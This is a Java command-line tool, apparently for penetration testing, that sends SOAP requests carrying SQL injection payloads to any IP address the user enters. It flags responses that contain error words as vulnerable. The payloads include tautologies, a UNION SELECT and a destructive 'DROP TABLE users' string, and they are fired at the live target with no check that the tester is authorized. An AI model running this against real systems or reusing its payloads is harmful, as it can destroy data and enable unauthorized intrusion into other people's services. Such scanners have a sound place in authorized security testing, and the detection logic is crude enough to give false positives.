import java.io.*;
import java.net.*;
import java.util.regex.*;

public class SOAPSQLInjectionDetector {

    // Function to send SOAP requests and detect SQL injection vulnerabilities
    public static void detectSOAPSQLInjection(String ipAddress) {
        System.out.println("Checking for potential SOAP-based SQL injection vulnerabilities on " + ipAddress + "...\n");

        // List of common SQL injection payloads
        String[] sqlPayloads = {
            "' OR 1=1 --",  // Basic SQL injection payload
            "' OR 'a'='a'",  // Always true condition
            "'; DROP TABLE users; --",  // SQL to drop table
            "' UNION SELECT NULL, NULL, NULL --",  // SQL UNION attack
        };

        // SOAP request template (modify based on the actual SOAP API structure)
        String soapRequestTemplate = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
            "                  xmlns:web=\"http://www.example.com/webservice\">\n" +
            "   <soapenv:Header/>\n" +
            "   <soapenv:Body>\n" +
            "      <web:getUserDetails>\n" +
            "         <web:userInput>%s</web:userInput>\n" +
            "      </web:getUserDetails>\n" +
            "   </soapenv:Body>\n" +
            "</soapenv:Envelope>";

        // Base URL for testing SOAP endpoint (adjust the path based on the actual SOAP API)
        String baseUrl = "http://" + ipAddress + "/soapendpoint";  // Modify this to match the actual SOAP service endpoint

        for (String payload : sqlPayloads) {
            // Construct the SOAP request with the payload
            String soapRequest = String.format(soapRequestTemplate, payload);

            try {
                // Create a URL object
                URL url = new URL(baseUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);

                // Set headers
                connection.setRequestProperty("Content-Type", "text/xml;charset=UTF-8");
                connection.setRequestProperty("SOAPAction", "http://www.example.com/webservice/getUserDetails");

                // Send the SOAP request
                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = soapRequest.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                // Get the response
                int responseCode = connection.getResponseCode();
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                // Check for signs of SQL injection in the response (e.g., error messages or abnormal responses)
                String responseText = response.toString().toLowerCase();
                if (responseText.contains("error") || Pattern.compile("syntax|error|unclosed|unexpected", Pattern.CASE_INSENSITIVE).matcher(responseText).find()) {
                    System.out.println("[!] Potential SOAP-based SQL injection vulnerability detected with payload: " + payload);
                    System.out.println("Response contains error or unusual output: " + responseText.substring(0, Math.min(responseText.length(), 300)) + "...");
                } else {
                    System.out.println("[+] No SOAP-based SQL injection detected with payload: " + payload);
                }

            } catch (IOException e) {
                System.out.println("[!] Error making request for payload " + payload + ": " + e.getMessage());
            }
        }
    }

    // Main function to prompt the user and start the detection process
    public static void main(String[] args) {
        System.out.println("===================== SOAP-Based SQL Injection Detection Tool ===================== ");

        // Prompt the user for an IP address to test for SOAP-based SQL injection
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        System.out.print("Enter the target IP address:");
        try {
            String ipAddress = reader.readLine();

            // Start detecting SOAP-based SQL injection vulnerabilities
            detectSOAPSQLInjection(ipAddress);
        } catch (IOException e) {
            System.out.println("[!] Error reading input: " + e.getMessage());
        }
    }
}
